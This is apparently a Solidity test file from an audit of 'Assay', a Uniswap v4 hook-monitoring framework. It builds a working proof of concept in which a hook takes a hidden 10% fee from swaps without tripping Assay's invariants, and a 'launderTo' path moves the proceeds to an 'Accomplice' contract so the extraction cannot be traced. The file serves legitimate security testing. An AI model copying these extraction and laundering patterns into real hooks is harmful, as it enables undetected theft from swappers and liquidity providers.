// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {CustomRevert} from "@uniswap/v4-core/src/libraries/CustomRevert.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {ModifyLiquidityParams, SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {Constants} from "@uniswap/v4-core/test/utils/Constants.sol";
import {CurrencySettler} from "@openzeppelin/uniswap-hooks/src/utils/CurrencySettler.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";

import {BaseTest} from "../utils/BaseTest.sol";
import {AssayFlowMeter} from "../../src/assay/AssayFlowMeter.sol";
import {AssayHook} from "../../src/assay/AssayHook.sol";
import {PoolLedger} from "../../src/assay/PoolLedger.sol";
import {DeltaBudgetPredicate} from "../../src/assay/predicates/DeltaBudgetPredicate.sol";

/// @notice The hook under test. ONE immutable switch separates the two shapes:
///
///   eager == true   the ordinary v4 fee pattern, as used by v4-core's FeeTakingHook and by this
///                   repo's own HardcapHook ("Debt now, credit via returned delta"). take() runs
///                   INSIDE the callback, so the hook is momentarily in debt to PoolManager while
///                   Assay is looking. THIS IS THE NEGATIVE CONTROL.
///
///   eager == false  the same economics, one line moved. The hook takes nothing inside the callback
///                   and simply returns the fee as its afterSwap delta. PoolManager credits the hook
///                   AFTER the callback returns, so the hook's delta goes 0 -> +fee: POSITIVE, never
///                   negative. It harvests the credit later, from a plain external function that is
///                   not a hook callback and that Assay's sealing therefore never sees.
contract ReturnDeltaFeeHook is AssayFlowMeter {
    using CurrencySettler for Currency;

    uint256 public immutable feeBps;
    bool public immutable eager;

    /// @dev The hook's OWN bookkeeping. Never trusted by the test; used only to cross-check.
    uint256 public accrued;

    /// @dev SIGNED delta at the exact instant `_assertInvariants()` is about to run. Recorded to
    /// settle the fixability question: would measuring |delta| instead of debt() have caught this?
    int256 public deltaSeenByTheSpec;

    constructor(
        IPoolManager pm_,
        address[] memory invariants_,
        Currency meterCurrency_,
        uint256 perBlockLimit_,
        uint256 feeBps_,
        bool eager_
    ) AssayFlowMeter(pm_, invariants_, meterCurrency_, perBlockLimit_) {
        feeBps = feeBps_;
        eager = eager_;
    }

    function getHookPermissions() public pure override returns (Hooks.Permissions memory) {
        return Hooks.Permissions({
            beforeInitialize: false,
            afterInitialize: false,
            beforeAddLiquidity: false,
            afterAddLiquidity: false,
            beforeRemoveLiquidity: false,
            afterRemoveLiquidity: false,
            beforeSwap: true,
            afterSwap: true,
            beforeDonate: false,
            afterDonate: false,
            beforeSwapReturnDelta: false,
            afterSwapReturnDelta: true,
            afterAddLiquidityReturnDelta: false,
            afterRemoveLiquidityReturnDelta: false
        });
    }

    function _assayAfterSwap(
        address,
        PoolKey calldata key,
        SwapParams calldata params,
        BalanceDelta delta,
        bytes calldata
    ) internal override returns (bytes4, int128) {
        (Currency unspecified, uint256 notional) = _unspecified(key, params, delta);
        uint256 fee = (notional * feeBps) / 10_000;
        if (fee == 0) return (this.afterSwap.selector, int128(0));

        accrued += fee;
        if (eager) {
            // Debt now, credit via the returned delta. Visible to Assay for the width of this call.
            unspecified.take(poolManager, address(this), fee, false);
        }
        deltaSeenByTheSpec = PoolLedger.delta(poolManager, address(this), unspecified);
        return (this.afterSwap.selector, int128(int256(fee)));
    }

    /// @notice Harvest the credit PoolManager applied after the callback closed.
    /// @dev NOT a hook callback. `AssayBaseHook` seals `_afterSwap`; it does not and cannot seal
    /// this. Taking against an existing CREDIT moves the delta +fee -> 0. It never goes negative,
    /// so `PoolLedger.debt()` — which every Assay meter reads — is zero at every instant.
    function harvest(Currency c) external returns (uint256 got) {
        int256 d = PoolLedger.delta(poolManager, address(this), c);
        if (d <= 0) return 0;
        got = uint256(d);
        poolManager.take(c, address(this), got);
    }

    /// @notice Same harvest, but the proceeds are relocated to an unrelated address via ERC-6909,
    /// so the extraction is not merely unmetered but unattributable afterwards.
    function launderTo(Currency c, address to) external returns (uint256 got) {
        int256 d = PoolLedger.delta(poolManager, address(this), c);
        if (d <= 0) return 0;
        got = uint256(d);
        poolManager.mint(to, c.toId(), got); // hook delta +got -> 0. Still never negative.
    }

    function liveDebt(Currency c) external view returns (uint256) {
        return PoolLedger.debt(poolManager, address(this), c);
    }

    function _unspecified(PoolKey calldata key, SwapParams calldata params, BalanceDelta delta)
        private
        pure
        returns (Currency unspecified, uint256 notional)
    {
        int128 amt;
        (unspecified, amt) = (params.amountSpecified < 0 == params.zeroForOne)
            ? (key.currency1, delta.amount1())
            : (key.currency0, delta.amount0());
        notional = amt >= 0 ? uint256(uint128(amt)) : uint256(uint128(-amt));
    }
}

/// @notice The accomplice. Never touches an ERC-20; only converts claims back into a credit.
contract Accomplice {
    IPoolManager public immutable pm;

    constructor(IPoolManager pm_) {
        pm = pm_;
    }

    function collect(Currency c, uint256 amount) external {
        pm.burn(address(this), c.toId(), amount);
        pm.take(c, address(this), amount);
    }
}

/// @notice A hook's own periphery. Every serious v4 hook ships one. It is the single call inside the
/// unlock, after the last callback, that the attack needs.
contract HookRouter is IUnlockCallback {
    using CurrencySettler for Currency;

    enum Mode {
        NONE,
        HARVEST,
        LAUNDER
    }

    IPoolManager public immutable pm;

    constructor(IPoolManager pm_) {
        pm = pm_;
    }

    function addLiquidity(PoolKey memory key, int256 liq) external {
        pm.unlock(abi.encode(uint8(0), key, liq, false, uint256(0), Mode.NONE, address(0)));
    }

    function swap(PoolKey memory key, bool zeroForOne, uint256 amountIn, Mode mode, address accomplice) external {
        pm.unlock(abi.encode(uint8(1), key, int256(0), zeroForOne, amountIn, mode, accomplice));
    }

    function unlockCallback(bytes calldata raw) external returns (bytes memory) {
        require(msg.sender == address(pm), "not pm");
        (uint8 op, PoolKey memory key, int256 liq, bool zeroForOne, uint256 amountIn, Mode mode, address accomplice) =
            abi.decode(raw, (uint8, PoolKey, int256, bool, uint256, Mode, address));

        if (op == 0) {
            pm.modifyLiquidity(
                key,
                ModifyLiquidityParams({
                    tickLower: TickMath.minUsableTick(key.tickSpacing),
                    tickUpper: TickMath.maxUsableTick(key.tickSpacing),
                    liquidityDelta: liq,
                    salt: bytes32(0)
                }),
                ""
            );
        } else {
            pm.swap(
                key,
                SwapParams({
                    zeroForOne: zeroForOne,
                    amountSpecified: -int256(amountIn),
                    sqrtPriceLimitX96: zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
                }),
                ""
            );
            // The one extra call inside the unlock. See the test's `test_condition_*`.
            Currency feeCurrency = zeroForOne ? key.currency1 : key.currency0;
            if (mode == Mode.HARVEST) ReturnDeltaFeeHook(address(key.hooks)).harvest(feeCurrency);
            if (mode == Mode.LAUNDER) {
                uint256 got = ReturnDeltaFeeHook(address(key.hooks)).launderTo(feeCurrency, accomplice);
                if (got > 0) Accomplice(accomplice).collect(feeCurrency, got);
            }
        }

        _square(key.currency0);
        _square(key.currency1);
        return "";
    }

    function _square(Currency c) private {
        int256 d = PoolLedger.delta(pm, address(this), c);
        if (d < 0) c.settle(pm, address(this), uint256(-d), false);
        if (d > 0) c.take(pm, address(this), uint256(d), false);
    }
}

/// @notice A predicate that is simply false. Used to prove the spec is actually EVALUATED on the
/// attack path — audit finding A-2 was an invariant campaign that passed because its invariants were
/// structurally incapable of failing, and this test must not repeat it.
contract AlwaysFalsePredicate {
    function check(address) external pure returns (bool) {
        return false;
    }

    function describe() external pure returns (string memory) {
        return "never";
    }
}

/// @title EXECUTION of IDEAS_LEDGER_FOLD.md §1.7
/// @notice Written by someone who did not write the defence (standing order, 2026-08-26 audit).
contract AssayReturnDeltaBlindSpotTest is BaseTest {
    uint24 constant FEE = 3000;
    int24 constant TICK_SPACING = 60;
    uint256 constant FEE_BPS = 1_000; // 10% of the swap's output. Nobody would call this subtle.
    uint256 constant TIGHT_BUDGET = 1; // wei. The tightest non-trivial spec expressible.
    uint256 constant SWAP_IN = 1e18;

    uint160 constant FLAGS =
        uint160(Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);

    Currency c0;
    Currency c1;
    HookRouter router;
    Accomplice accomplice;
    uint256 saltNonce;

    function setUp() public {
        deployArtifactsAndLabel();
        (c0, c1) = deployCurrencyPair();
        vm.roll(100);
        router = new HookRouter(poolManager);
        accomplice = new Accomplice(poolManager);
        MockERC20(Currency.unwrap(c0)).mint(address(router), 1_000_000e18);
        MockERC20(Currency.unwrap(c1)).mint(address(router), 1_000_000e18);
    }

    /// @dev Deploys a hook carrying the tightest spec Assay can express: it may never owe
    /// PoolManager more than 1 wei of EITHER currency, and may never move more than 1 wei per block.
    function _deployHook(bool eager) internal returns (ReturnDeltaFeeHook hook, PoolKey memory key) {
        address addr = address(FLAGS ^ (uint160(0xBEEF + saltNonce++) << 144));

        address[] memory invs = new address[](2);
        invs[0] = address(new DeltaBudgetPredicate(poolManager, c0, TIGHT_BUDGET));
        invs[1] = address(new DeltaBudgetPredicate(poolManager, c1, TIGHT_BUDGET));

        deployCodeTo(
            "AssayReturnDeltaBlindSpot.t.sol:ReturnDeltaFeeHook",
            abi.encode(poolManager, invs, c1, TIGHT_BUDGET, FEE_BPS, eager),
            addr
        );
        hook = ReturnDeltaFeeHook(addr);

        key = PoolKey(c0, c1, FEE, TICK_SPACING, hook);
        poolManager.initialize(key, Constants.SQRT_PRICE_1_1);
        router.addLiquidity(key, 100e18);
    }

    // --------------------------------------------------------------- NEGATIVE CONTROL

    /// @notice Same hook, same spec, take() INSIDE the callback. Assay must and does stop it.
    function test_control_takeInsideTheCallbackTripsTheSpec() public {
        (ReturnDeltaFeeHook hook, PoolKey memory key) = _deployHook(true);
        // v4 wraps a reverting hook call. Match the whole envelope so a rig failure cannot pass as
        // a spec violation.
        vm.expectRevert(
            abi.encodeWithSelector(
                CustomRevert.WrappedError.selector,
                address(hook),
                IHooks.afterSwap.selector,
                abi.encodeWithSelector(AssayHook.InvariantViolated.selector, hook.runtimeInvariants()[1]),
                abi.encodeWithSelector(Hooks.HookCallFailed.selector)
            )
        );
        router.swap(key, true, SWAP_IN, HookRouter.Mode.HARVEST, address(0));
    }

    // --------------------------------------------------------------- THE CLAIM

    /// @notice One line moved. Same fee, same spec, same pool. Assay sees nothing.
    function test_returnDeltaExtractionIsCompletelyUnmetered() public {
        (ReturnDeltaFeeHook hook, PoolKey memory key) = _deployHook(false);

        MockERC20 token1 = MockERC20(Currency.unwrap(c1));
        uint256 hookBefore = token1.balanceOf(address(hook));
        uint256 pmBefore = token1.balanceOf(address(poolManager));
        uint256 routerBefore = token1.balanceOf(address(router));

        for (uint256 i = 0; i < 5; ++i) {
            router.swap(key, true, SWAP_IN, HookRouter.Mode.HARVEST, address(0));
        }

        // Measured independently of anything the hook says: real ERC-20 that left PoolManager and
        // is now sitting in the hook's own token balance.
        uint256 extracted = token1.balanceOf(address(hook)) - hookBefore;
        uint256 pmLost = pmBefore - token1.balanceOf(address(poolManager));
        uint256 swapperGot = token1.balanceOf(address(router)) - routerBefore;

        assertGt(extracted, 0, "hook must actually have extracted something");
        // Conservation, checked against three independent balances: everything that left the
        // PoolManager went either to the swapper or to the hook. Nothing is inferred from the hook.
        assertEq(pmLost, swapperGot + extracted, "conservation across PoolManager / swapper / hook");
        assertEq(extracted, hook.accrued(), "and it matches the fee the hook charged");

        // ...while the spec it declared, and would bond, reads perfectly healthy.
        assertEq(hook.liveDebt(c0), 0, "no debt in currency0, ever");
        assertEq(hook.liveDebt(c1), 0, "no debt in currency1, ever");
        assertEq(hook.flowThisBlock(), 0, "the flow meter metered nothing");
        assertTrue(
            DeltaBudgetPredicate(hook.runtimeInvariants()[1]).check(address(hook)),
            "the budget predicate says the hook is inside its 1-wei budget"
        );

        emit log_named_uint("currency1 that left the PoolManager", pmLost);
        emit log_named_uint("  of which the swapper received", swapperGot);
        emit log_named_uint("  of which the HOOK extracted, unmetered", extracted);
        // FIXABILITY, settled by measurement rather than argument: the signed delta at the instant
        // the spec runs is ZERO, not merely non-negative. Swapping debt() for abs(delta) in every
        // predicate would change nothing, because the credit has not been applied yet.
        assertEq(hook.deltaSeenByTheSpec(), 0, "abs(delta) would read zero too");

        emit log_named_uint("declared per-block flow limit (wei)", hook.flowLimitPerBlock());
        emit log_named_uint("flow meter reading", hook.flowThisBlock());
    }

    /// @notice Chains §1.4: the proceeds never touch the hook at all.
    function test_theProceedsCanBeRelocatedSoTheHookNeverHoldsThem() public {
        (ReturnDeltaFeeHook hook, PoolKey memory key) = _deployHook(false);
        MockERC20 token1 = MockERC20(Currency.unwrap(c1));

        router.swap(key, true, SWAP_IN, HookRouter.Mode.LAUNDER, address(accomplice));

        assertEq(token1.balanceOf(address(hook)), 0, "hook holds nothing");
        assertGt(token1.balanceOf(address(accomplice)), 0, "the accomplice holds the money");
        assertEq(token1.balanceOf(address(accomplice)), hook.accrued(), "all of it");
        assertEq(hook.liveDebt(c1), 0, "and the hook was never in debt");
        emit log_named_uint("extracted to an unrelated address", token1.balanceOf(address(accomplice)));
    }

    /// @notice RIG CHECK. Identical hook and identical path, with one invariant that always reads
    /// false. It reverts — so the sealed callback really does evaluate the declared spec on exactly
    /// the path where the extraction above went unnoticed. The blind spot is in what the ledger can
    /// see, not in whether Assay bothered to look.
    function test_rigCheck_theSpecIsGenuinelyEvaluatedOnTheAttackPath() public {
        address addr = address(FLAGS ^ (uint160(0xBEEF + saltNonce++) << 144));
        address[] memory invs = new address[](1);
        invs[0] = address(new AlwaysFalsePredicate());
        deployCodeTo(
            "AssayReturnDeltaBlindSpot.t.sol:ReturnDeltaFeeHook",
            abi.encode(poolManager, invs, c1, TIGHT_BUDGET, FEE_BPS, false),
            addr
        );
        PoolKey memory key = PoolKey(c0, c1, FEE, TICK_SPACING, ReturnDeltaFeeHook(addr));
        poolManager.initialize(key, Constants.SQRT_PRICE_1_1);
        // Liquidity is unaffected: this hook holds no liquidity permissions, so nothing asserts there.
        router.addLiquidity(key, 100e18);

        vm.expectRevert(
            abi.encodeWithSelector(
                CustomRevert.WrappedError.selector,
                addr,
                IHooks.beforeSwap.selector,
                abi.encodeWithSelector(AssayHook.InvariantViolated.selector, invs[0]),
                abi.encodeWithSelector(Hooks.HookCallFailed.selector)
            )
        );
        router.swap(key, true, SWAP_IN, HookRouter.Mode.HARVEST, address(0));
    }

    // --------------------------------------------------------------- THE CONDITION

    /// @notice The attack is NOT free-standing. PoolManager's own settlement invariant forces the
    /// hook to be handed control once more inside the unlock; without it the credit strands and the
    /// whole transaction reverts. This is what makes the finding conditional rather than universal.
    function test_condition_withoutAPostCallbackSweepTheTransactionReverts() public {
        (, PoolKey memory key) = _deployHook(false);
        vm.expectRevert(IPoolManager.CurrencyNotSettled.selector);
        router.swap(key, true, SWAP_IN, HookRouter.Mode.NONE, address(0));
    }
}
